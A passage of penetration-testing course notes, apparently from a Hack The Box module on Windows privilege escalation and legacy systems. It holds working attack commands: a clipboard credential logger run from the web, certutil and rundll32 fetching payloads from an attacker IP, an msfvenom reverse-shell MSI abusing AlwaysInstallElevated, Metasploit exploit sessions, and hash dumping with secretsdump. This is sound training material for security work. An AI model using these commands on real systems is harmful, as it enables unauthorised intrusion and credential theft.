> We can use the [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) script to extract user clipboard data. Start the logger by issuing the command below.

### **Monitor the Clipboard with PowerShell**

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

> The script will start to monitor for entries in the clipboard and present them in the PowerShell session. We need to be patient and wait until we capture sensitive information.

### **Capture Credentials from the Clipboard with Invoke-ClipboardLogger**

```powershell-session
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

> Note: User credentials can be obtained with tools such as Mimikatz or a keylogger. C2 Frameworks such as Metasploit contain built-in functions for keylogging.

## Roles and Services

> Services on a particular host may serve the host itself or other hosts on the target network. It is necessary to create a profile of each targeted host, documenting the configuration of these services, their purpose, and how we can potentially use them to achieve our assessment goals. Typical server roles and services include:
>
> * File and Print Servers
> * Web and Database Servers
> * Certificate Authority Servers
> * Source Code Management Servers
> * Backup Servers
>
> Let's take `Backup Servers` as an example, and how, if we compromise a server or host with a backup system, we can compromise the network.

### **Attacking Backup Servers**

> In information technology, a `backup` or `data backup` is a copy of computer data taken and stored elsewhere so that it may be used to restore the original after a data loss event. Backups can be used to recover data after a loss due to data deletion or corruption or to recover data from an earlier time. Backups provide a simple form of disaster recovery. Some backup systems can reconstitute a computer system or other complex configurations, such as an Active Directory server or database server.
>
> Typically backup systems need an account to connect to the target machine and perform the backup. Most companies require that backup accounts have local administrative privileges on the target machine to access all its files and services.
>
> If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.
>
> As we previously discussed, we are looking for information that can help us move laterally in the network or escalate our privileges. Let's use [restic](https://restic.net/) as an example. `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.
>
> To start working with `restic`, we must create a `repository` (the directory where backups will be stored). `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository. If this variable is not set, it will ask for the password to initialize the repository and for any other operation in this repository.
>
> We will use `restic 0.13.1` and back up the repository `C:\xampp\htdocs\webapp` in `E:\restic\` directory. To download the latest version of restic, visit <https://github.com/restic/restic/releases/latest>. On our target machine, restic is located at `C:\Windows\System32\restic.exe`.
>
> We first need to create and initialize the location where our backup will be saved, called the `repository`.

### **restic - Initialize Backup Directory**

```powershell-session
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
```

> Then we can create our first backup.

### **restic - Back up a Directory**

```powershell-session
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
```

> If we want to back up a directory such as `C:\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

### **restic - Back up a Directory with VSS**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
```

> Note: If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message. The backup will be created, but no content will be found.

> We can also check which backups are saved in the repository using the `snapshot` command.

### **restic - Check Backups Saved in a Repository**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ snapshots
```

> We can restore a backup using the ID.

### **restic - Restore a Backup with ID**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
```

> If we navigate to `C:\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\Restore\C\SampleFolder`.
>
> We need to understand our targets and what kind of information we are looking for. If we find a backup for a Linux machine, we may want to check files like `/etc/shadow` to crack users' credentials, web configuration files, `.ssh` directories to look for SSH keys, etc.
>
> If we are targeting a Windows backup, we may want to look for the SAM & SYSTEM hive to extract local account hashes. We can also identify web application directories and common files where credentials or sensitive information is stored, such as web.config files. Our goal is to look for any interesting files that can help us achieve our goal.

> Note: restic works similarly in Linux. If we don't know where restic snapshots are saved, we can look in the file system for a directory named snapshots. Keep in mind that the environment variable may not be set. If that's the case, we will need to provide a password to restore the files.

> Hundreds of applications and methods exist to perform backups, and we cannot detail each. This `restic` case is an example of how a backup application could work. Other systems will manage a centralized console and special repositories to save the backup information and execute the backup tasks.
>
> As we move forward, we will find different backup systems, and we recommend taking the time to understand how they work so that we can eventually abuse their functions for our purpose.

## 3.Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

The [LOLBAS project](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker. Some interesting functionality may include:

|                        |                  |                  |
| ---------------------- | ---------------- | ---------------- |
| Code execution         | Code compilation | File transfers   |
| Persistence            | UAC bypass       | Credential theft |
| Dumping process memory | Keylogging       | Evasion          |
| DLL hijacking          |                  |                  |

### **Transferring File with Certutil**

```powershell-session
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

### Encoding File with Certutil

```cmd-session
C:\htb> certutil -encode file1 encodedfile
```

### **Decoding File with Certutil**

```cmd-session
C:\htb> certutil -decode encodedfile file2
```

> A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.
>
> It is worth reviewing this project and becoming familiar with as many binaries, scripts, and libraries as possible. They could prove to be very useful during an evasive assessment, or one in which the client restricts us to only a managed Windows workstation/server instance to test from.

## Always Install Elevated

> This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.
>
> * `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
> * `User Configuration\Administrative Templates\Windows Components\Windows Installer`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F1xTAS8PEElDOZLHc2uGB%2Fimage.png?alt=media&amp;token=8ff1b6fc-3f77-4442-b390-eb6e1cfca8e4" alt=""><figcaption></figcaption></figure>

### Enumerating Always Install Elevated Settings

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```

```powershell-session
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

> Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

### **Generating MSI Package**

```shell-session
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

### **Executing MSI Package**

```cmd-session
C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

### **Catching Shell**

```shell-session
nc -lnvp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.33] 49720
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

## CVE-2019-1388

> [CVE-2019-1388](https://nvd.nist.gov/vuln/detail/CVE-2019-1388) was a privilege escalation vulnerability in the Windows Certificate Dialog, which did not properly enforce user privileges. The issue was in the UAC mechanism, which presented an option to show information about an executable's certificate, opening the Windows certificate dialog when a user clicks the link. The `Issued By` field in the General tab is rendered as a hyperlink if the binary is signed with a certificate that has Object Identifier (OID) `1.3.6.1.4.1.311.2.1.10`. This OID value is identified in the [wintrust.h](https://docs.microsoft.com/en-us/windows/win32/api/wintrust/) header as [SPC\_SP\_AGENCY\_INFO\_OBJID](https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptformatobject) which is the `SpcSpAgencyInfo` field in the details tab of the certificate dialog. If it is present, a hyperlink included in the field will render in the General tab. This vulnerability can be exploited easily using an old Microsoft-signed executable ([hhupd.exe](https://packetstormsecurity.com/files/14437/hhupd.exe.html)) that contains a certificate with the `SpcSpAgencyInfo` field populated with a hyperlink.
>
> When we click on the hyperlink, a browser window will launch running as `NT AUTHORITY\SYSTEM`. Once the browser is opened, it is possible to "break out" of it by leveraging the `View page source` menu option to launch a `cmd.exe` or `PowerShell.exe` console as SYSTEM.
>
> Let's run through the vulnerability in practice.
>
> First right click on the `hhupd.exe` executable and select `Run as administrator` from the menu.

<br>

<figure><img src="https://academy.hackthebox.com/storage/modules/67/hhupd.png" alt=""><figcaption></figcaption></figure>

> Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.

![Certificate details window for Microsoft Corporation. Fields include Certificate Policies, Key Usage Restriction, and Thumbprint. Policy Information URL: https://www.verisign.com/repository/CPS.](https://academy.hackthebox.com/storage/modules/67/hhupd_details.png)

> Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.

![Certificate Information window for Microsoft Corporation. Purpose: Ensures software authenticity and protection. Issued by VeriSign Commercial Software Publishers CA. Valid from 4/15/1998 to 4/16/1999.](https://academy.hackthebox.com/storage/modules/67/hhupd_ok.png)

> If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.

![Browser window showing 404 Error on VeriSign page. Task Manager open, listing multiple chrome.exe processes running under SYSTEM user, and other processes like conhost.exe and FileZilla Server.](https://academy.hackthebox.com/storage/modules/67/chrome_system.png)

> Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.

![Save As dialog open in Chrome with error message: 'Location is not available. C:\Windows\system32\config\systemprofile\Desktop is unavailable.' Options to save webpage as 'Webpage, Complete' with OK button visible.](https://academy.hackthebox.com/storage/modules/67/hhupd_saveas.png)

> At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

![Command prompt running as NT AUTHORITY\SYSTEM, showing Windows version. 'whoami' command confirms SYSTEM user. Save As dialog open with path C:\Windows\System32\cmd.exe.](https://academy.hackthebox.com/storage/modules/67/hhupd_cmd.png)

> Microsoft released a [patch](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388) for this issue in November of 2019. Still, as many organizations fall behind on patching, we should always check for this vulnerability if we gain GUI access to a potentially vulnerable system as a low-privilege user.
>
> This [link](https://web.archive.org/web/20210620053630/https://gist.github.com/gentilkiwi/802c221c0731c06c22bb75650e884e5a) lists all of the vulnerable Windows Server and Workstation versions.

> Note: The steps above were done using the Chrome browser and may differ slightly in other browsers.

## Scheduled Tasks

### **Enumerating Scheduled Tasks**

```cmd-session
C:\htb>  schtasks /query /fo LIST /v
```

### **Enumerating Scheduled Tasks with PowerShell**

```powershell-session
PS C:\htb> Get-ScheduledTask | select TaskName,State
```

> By default, we can only see tasks created by our user and default scheduled tasks that every Windows operating system has. Unfortunately, we cannot list out scheduled tasks created by other users (such as admins) because they are stored in `C:\Windows\System32\Tasks`, which standard users do not have read access to. It is not uncommon for system administrators to go against security practices and perform actions such as provide read or write access to a folder usually reserved only for administrators. We (though rarely) may encounter a scheduled task that runs as an administrator configured with weak file/folder permissions for any number of reasons. In this case, we may be able to edit the task itself to perform an unintended action or modify a script run by the scheduled task.

### Checking Permissions on C:\Scripts Directory

> Consider a scenario where we are on the fourth day of a two-week penetration test engagement. We have gained access to a handful of systems so far as unprivileged users and have exhausted all options for privilege escalation. Just at this moment, we notice a writeable `C:\Scripts` directory that we overlooked in our initial enumeration.

```cmd-session
C:\htb> .\accesschk64.exe /accepteula -s -d C:\Scripts\
```

> We notice various scripts in this directory, such as `db-backup.ps1`, `mailbox-backup.ps1`, etc., which are also all writeable by the `BUILTIN\USERS` group. At this point, we can append a snippet of code to one of these files with the assumption that at least one of these runs on a daily, if not more frequent, basis. We write a command to send a beacon back to our C2 infrastructure and carry on with testing. The next morning when we log on, we notice a single beacon as `NT AUTHORITY\SYSTEM` on the DB01 host. We can now safely assume that one of the backup scripts ran overnight and ran our appended code in the process. This is an example of how important even the slightest bit of information we uncover during enumeration can be to the success of our engagement. Enumeration and post-exploitation during an assessment are iterative processes. Each time we perform the same task across different systems, we may be gaining more pieces of the puzzle that, when put together, will get us to our goal.

## User/Computer Description Field

### Checking Local User Description Field

```powershell-session
PS C:\htb> Get-LocalUser
```

### Enumerating Computer Description Field with Get-WmiObject Cmdlet

```powershell-session
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```

## Mount VHDX/VMDK

> During our enumeration, we will often come across interesting files both locally and on network share drives. We may find passwords, SSH keys or other data that can be used to further our access. The tool [Snaffler](https://github.com/SnaffCon/Snaffler) can help us perform thorough enumeration that we could not otherwise perform by hand. The tool searches for many interesting file types, such as files containing the phrase "pass" in the file name, KeePass database files, SSH keys, web.config files, and many more.
>
> Three specific file types of interest are `.vhd`, `.vhdx`, and `.vmdk` files. These are `Virtual Hard Disk`, `Virtual Hard Disk v2` (both used by Hyper-V), and `Virtual Machine Disk` (used by VMware). Let's assume that we land on a web server and have had no luck escalating privileges, so we resort to hunting through network shares. We come across a backups share hosting a variety of `.VMDK` and `.VHDX` files whose filenames match hostnames in the network. One of these files matches a host that we were unsuccessful in escalating privileges on, but it is key to our assessment because there is an Active Domain admin session. If we can escalate to SYSTEM, we can likely steal the user's NTLM password hash or Kerberos TGT ticket and take over the domain.
>
> If we encounter any of these three files, we have options to mount them on either our local Linux or Windows attack boxes. If we can mount a share from our Linux attack box or copy over one of these files, we can mount them and explore the various operating system files and folders as if we were logged into them using the following commands.

### **Mount VMDK on Linux**

```shell-session
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

### **Mount VHD/VHDX on Linux**

```shell-session
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

> In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file. If preferred, we can use the [Mount-VHD](https://docs.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd?view=windowsserver2019-ps) PowerShell cmdlet. Regardless of the method, once we do this, the virtual hard disk will appear as a lettered drive that we can then browse.

<figure><img src="https://academy.hackthebox.com/storage/modules/67/mount.png" alt=""><figcaption></figcaption></figure>

> For a `.vmdk` file, we can right-click and choose `Map Virtual Disk` from the menu. Next, we will be prompted to select a drive letter. If all goes to plan, we can browse the target operating system's files and directories. If this fails, we can use VMWare Workstation `File --> Map Virtual Disks` to map the disk onto our base system. We could also add the `.vmdk` file onto our attack VM as an additional virtual hard drive, then access it as a lettered drive. We can even use `7-Zip` to extract data from a .`vmdk` file. This [guide](https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/) illustrates many methods for gaining access to the files on a `.vmdk` file.

### **Retrieving Hashes using Secretsdump.py**

> Why do we care about a virtual hard drive (especially Windows)? If we can locate a backup of a live machine, we can access the `C:\Windows\System32\Config` directory and pull down the `SAM`, `SECURITY` and `SYSTEM` registry hives. We can then use a tool such as [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/secretsdump.py) to extract the password hashes for local users.

```shell-session
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

> We may get lucky and retrieve the local administrator password hash for the target system or find an old local administrator password hash that works on other systems in the environment (both of which I have done on quite a few assessments).


# Dealing with End of Life Systems

## 1.Legacy Operating Systems

While this module primarily focuses on modern operating systems (Windows 10/Windows Server 2016), as we have seen, certain issues (i.e., vulnerable software, misconfigurations, careless users, etc.) cannot be solved by merely upgrading to the latest and greatest Windows desktop and server versions. That being said, specific security improvements have been made over the years that no longer affect modern, supported versions of the Windows operating system. During our assessments, we will undoubtedly encounter legacy operating systems (especially against large organizations such as universities, hospitals/medical organizations, insurance companies, utilities, state/local government). It is essential to understand the differences and certain additional flaws that we need to check to ensure our assessments are as thorough as possible.

***

### End of Life Systems (EOL)

Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question. Windows systems first go into an "extended support" period before being classified as end-of-life or no longer officially supported. Microsoft continues to create security updates for these systems offered to large organizations through custom long-term support contracts. Below is a list of popular Windows versions and their end of life dates:

**Windows Desktop - EOL Dates by Version**

| Version                 | Date              |
| ----------------------- | ----------------- |
| Windows XP              | April 8, 2014     |
| Windows Vista           | April 11, 2017    |
| Windows 7               | January 14, 2020  |
| Windows 8               | January 12, 2016  |
| Windows 8.1             | January 10, 2023  |
| Windows 10 release 1507 | May 9, 2017       |
| Windows 10 release 1703 | October 9, 2018   |
| Windows 10 release 1809 | November 10, 2020 |
| Windows 10 release 1903 | December 8, 2020  |
| Windows 10 release 1909 | May 11, 2021      |
| Windows 10 release 2004 | December 14, 2021 |
| Windows 10 release 20H2 | May 10, 2022      |

**Windows Server - EOL Dates by Version**

| Version                | Date             |
| ---------------------- | ---------------- |
| Windows Server 2003    | April 8, 2014    |
| Windows Server 2003 R2 | July 14, 2015    |
| Windows Server 2008    | January 14, 2020 |
| Windows Server 2008 R2 | January 14, 2020 |
| Windows Server 2012    | October 10, 2023 |
| Windows Server 2012 R2 | October 10, 2023 |
| Windows Server 2016    | January 12, 2027 |
| Windows Server 2019    | January 9, 2029  |

This [page](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/) has a more detailed listing of the end-of-life dates for Microsoft Windows and other products such as Exchange, SQL Server, and Microsoft Office, all of which we may run into during our assessments.

***

### Impact

When operating systems are set to end of life and are no longer officially supported, there are many issues that may present themselves:

| Issue                                   | Description                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Lack of support from software companies | Certain applications (such as web browsers and other essential applications) may cease to work once a version of Windows is no longer officially supported.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| Hardware issues                         | Newer hardware components will likely stop working on legacy systems.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| Security flaws                          | This is the big one with a few notable exceptions (such as [CVE-2020-1350](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-1350) (SIGRed) or EternalBlue ([CVE-2017-0144](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0144))) which were easily exploitable and "wormable" security flaws which affected thousands of systems worldwide (including critical infrastructure such as hospitals). Microsoft will no longer release security updates for end-of-life systems. This could leave the systems open to remote code execution and privilege escalation flaws that will remain unpatched until the system is upgraded or retired. |

In some instances, it is difficult or impossible for an organization to upgrade or retire an end-of-life system due to cost and personnel constraints. The system may be running mission-critical software no longer supported by the original vendor. This is common in medical settings and local government, where the vendor for a critical application goes out of business or no longer provides support for an application, so the organization is stuck running it on a version of Windows XP or even Server 2000/2003. If we discover this during an assessment, it is best to discuss with the client to understand the business reasons why they cannot upgrade or retire the system(s) and suggest solutions such as strict network segmentation to isolate these systems until they can be dealt with appropriately.

As penetration testers, we will often come across legacy operating systems. Though I do not see many hosts running server 2000 or Windows XP workstations vulnerable to [MS08-067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067), they exist, and I come across them on occasion. It is more common to see a few Server 2003 hosts and 2008 hosts. When we come across these systems, they are often vulnerable to one or multiple remote code execution flaws or local privilege escalation vectors. They can be a great foothold into the environment. However, when attacking them, we should always check with the client to ensure they are not fragile hosts running mission-critical applications that could cause a massive outage. There are several security protections in newer Windows operating system versions that do not exist in legacy versions, making our privilege escalation tasks much more straightforward.

There are some notable differences among older and newer versions of Windows operating system versions. While this module aims to teach local privilege escalation techniques that can be used against modern Windows OS versions, we would be remiss in not going over some of the key differences between the most common versions. The core of the module focuses on various versions of Windows 10, Server 2016, and 2019, but let's take a trip down memory lane and analyze both a Windows 7 and a Server 2008 system from the perspective of a penetration tester with the goal of picking out key differences that are crucial during assessments of large environments.

## 2.Windows Server

Windows Server 2008/2008 R2 were made end-of-life on January 14, 2020. Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Server. It is not very common to encounter Server 2008 during an external penetration test, but I often encounter it during internal assessments.

***

### Server 2008 vs. Newer Versions

The table below shows some notable differences between Server 2008 and the latest Windows Server versions.

| Feature                                                                                                                                                             | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | -------------- | ----------- | ----------- |
| [Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection) |                |                |             | X           |
| [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1)                                 | Partial        | Partial        | X           | X           |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)                                         |                |                | X           | X           |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)                                            |                |                | X           | X           |
| [Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)       |                |                | X           | X           |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)                  | Partial        | X              | X           | X           |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)                                                                                  | Partial        | Partial        | X           | X           |
| [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)                                                                       |                |                | X           | X           |

***

### Server 2008 Case Study

Often during my assessments, I come across legacy operating system versions, both Windows and Linux. Sometimes these are merely forgotten systems that the client can quickly act on and decommission, while other times, these can be critical systems that can not be easily removed or replaced. Penetration testers need to understand the client's core business and hold discussions during the assessment, especially when dealing with scanning/enumeration and attacking legacy systems, and during the reporting phase. Not every environment is the same, and we must take many factors into account when writing recommendations for findings and assigning risk ratings. For example, medical settings may be running mission-critical software on Windows XP/7 or Windows Server 2003/2008 systems. Without understanding the reasoning "why," it is not good enough to merely tell them to remove the systems from the environment. If they are running costly MRI software that the vendor no longer supports, it could cost large sums of money to transition to new systems. In this case, we would have to look at other mitigating controls the client has in place, such as network segmentation, custom extended support from Microsoft, etc.

If we are assessing a client with the latest and greatest protections and find one Server 2008 host that was missed, then it may be as simple as recommending to upgrade or decommission. This could also be the case in environments subject to stringent audit/regulatory requirements where a legacy system could get them a "failing" or low score on their audit and even hold up or force them to lose government funding.

Let's take a look at a Windows Server 2008 host that we may uncover in a medical setting, large university, or local government office, among others.

For an older OS like Windows Server 2008, we can use an enumeration script like [Sherlock](https://github.com/rasta-mouse/Sherlock) to look for missing patches. We can also use something like [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target. If an exploit exists in the Metasploit framework for the given missing patch, the tool will suggest it. Other enumeration scripts can assist us with this, or we can even enumerate the patch level manually and perform our own research. This may be necessary if there are limitations in loading tools on the target host or saving command output.

## **Querying Current Patch Level**

```cmd-session
C:\htb> wmic qfe
```

### **Running Sherlock**

```powershell-session
PS C:\htb> Set-ExecutionPolicy bypass -Scope process
```

### **Obtaining a Meterpreter Shell**

```shell-session
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery
```

```shell-session
msf6 exploit(windows/smb/smb_delivery) > use 0
```

```shell-session
msf6 exploit(windows/smb/smb_delivery) > show options 
```

```shell-session
msf6 exploit(windows/smb/smb_delivery) > show targets
```

```shell-session
msf6 exploit(windows/smb/smb_delivery) > set target 0
```

```shell-session
msf6 exploit(windows/smb/smb_delivery) > exploit 
```

### **Rundll Command on Target Host**

Open a cmd console on the target host and paste in the `rundll32.exe` command.

```cmd-session
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

### **Receiving Reverse Shell**

```shell-session
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

### **Searching for Local Privilege Escalation Exploit**

From here, let's search for the [MS10\_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.

```shell-session
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338
```

### **Migrating to a 64-bit Process**

```shell-session
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

meterpreter > getpid
meterpreter > ps
meterpreter > migrate 2796
meterpreter > background
```

### **Setting Privilege Escalation Module Options**

```shell-session
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1
msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3

msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
msf6 exploit(windows/local/ms10_092_schelevator) > show options
```

### **Receiving Elevated Reverse Shell**

```shell-session
msf6 exploit(windows/local/ms10_092_schelevator) > exploit
meterpreter > getuid
meterpreter > sysinfo
```

### Attacking Server 2008

Taking the enumeration examples we have gone through in this module, access the system below, find one way to escalate to `NT AUTHORITY\SYSTEM` level access (there may be more than one way), and submit the `flag.txt` file on the Administrator desktop. Challenge yourself to escalate privileges multiple ways and don't merely reproduce the Task Scheduler privilege escalation detailed above.

## 3.Windows Desktop Versions

### Windows 7 vs. Newer Versions

Over the years, Microsoft has added enhanced security features to subsequent versions of Windows Desktop. The table below shows some notable differences between Windows 7 and Windows 10.

| Feature                                                                                                                                                           | Windows 7 | Windows 10 |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | ---------- |
| [Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/) |           | X          |
| [BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)                                                | Partial   | X          |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)                                       |           | X          |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)                                          |           | X          |
| [Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)     |           | X          |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)                | Partial   | X          |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)                                                                                | Partial   | X          |
| [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)                                                                     |           | X          |

***

### Windows 7 Case Study

To this date, estimates state that there may be over 100 million users still on Windows 7. According to [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), as of November 2020, Windows 7 was the second most used desktop operating system after Windows 10. Windows 7 is standard in large companies across the education, retail, transportation, healthcare, financial, government, and manufacturing sectors.

As discussed in the last section, as penetration testers, we must understand our clients' core business, risk appetite, and limitations that may prevent them from entirely moving off all versions of EOL systems such as Windows 7. It is not good enough for us to merely give them a finding for an EOL system with the recommendation of upgrading/decommissioning without any context. We should have ongoing discussions with our clients during our assessments to gain an understanding of their environment. Even if we can attack/escalate privileges on a Windows 7 host, there may be steps that a client can take to limit exposure until they can move off the EOL system(s).

A large retail client may have Windows 7 embedded devices in 100s of their stores running their point of sale (POS) systems. It may not be financially feasible for them to upgrade them all at once, so we may need to work with them to develop solutions to mitigate the risk. A large law firm with one old Windows 7 system may be able to upgrade immediately or even remove it from the network. Context is important.

Let's look at a Windows 7 host that we may uncover in one of the sectors mentioned above. For our Windows 7 target, we can use `Sherlock` again like in the Server 2008 example, but let's take a look at [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

## **Install Python Dependencies (local VM only)**

```shell-session
Olanzapine@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
Olanzapine@htb[/htb]$ sudo tar -xf setuptools-2.0.tar.gz
Olanzapine@htb[/htb]$ cd setuptools-2.0/
Olanzapine@htb[/htb]$ sudo python2.7 setup.py install

Olanzapine@htb[/htb]$ sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
Olanzapine@htb[/htb]$ sudo tar -xf xlrd-1.0.0.tar.gz
Olanzapine@htb[/htb]$ cd xlrd-1.0.0/
Olanzapine@htb[/htb]$ sudo python2.7 setup.py install
```

### **Gathering Systeminfo Command Output**

```cmd-session
C:\htb> systeminfo
```

### Updating the Local Microsoft Vulnerability Database

```shell-session
sudo python2.7 windows-exploit-suggester.py --update
```

### Running Windows Exploit Suggester

```shell-session
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 
```

> Suppose we have obtained a Meterpreter shell on our target using the Metasploit framework. In that case, we can also use this [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) which will help us quickly find any potential privilege escalation vectors and run them within Metasploit should any module exist.
>
